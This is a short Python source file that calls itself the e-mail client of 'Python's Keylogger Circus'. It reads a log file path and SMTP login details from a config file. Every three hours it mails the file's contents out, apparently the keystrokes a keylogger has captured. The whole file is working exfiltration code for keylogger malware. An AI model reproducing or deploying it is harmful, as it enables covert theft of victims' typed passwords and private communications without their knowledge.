#	Python's Email Sender
#		the e-mail client from Python's Keylogger Circus
#		- v.1.2

# SMTP and e-mail libraries
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Just timing stuff
import time
hours = 3600

#	Reads configuration file
from ConfigParser import SafeConfigParser
parser = SafeConfigParser()
parser.read('config.ini')

# Sets variables from confi.ini
dir = parser.get('Setup','directory')
smtp = parser.get('Email','smtp')
port = parser.get('Email','port')

def EmailSender():
	f=open(dir,'rb')
	buffer = MIMEText(f.read())
	f.close()
	
	msg = MIMEMultipart('alternative')
	#Creates html message
	html = """\
	<html>
		<head></head>
		<body>
	"""
	html += buffer.as_string()
	html += """\
		</body>
	</html>
	"""
	
	#Attachs message
	msg.attach(MIMEText(html,'html'))

	# sender and receiver address
	# from config.ni
	address = parser.get('Email','login')
	password = parser.get('Email','pass')
	
	# STMP and port from config file	
	server = smtplib.SMTP(smtp+':'+port)
	server.starttls()
	server.set_debuglevel(1)
	server.login(address,password)
	server.sendmail(address,address,msg.as_string())
	server.quit()

while(1):
	EmailSender()
	time.sleep(3*hours)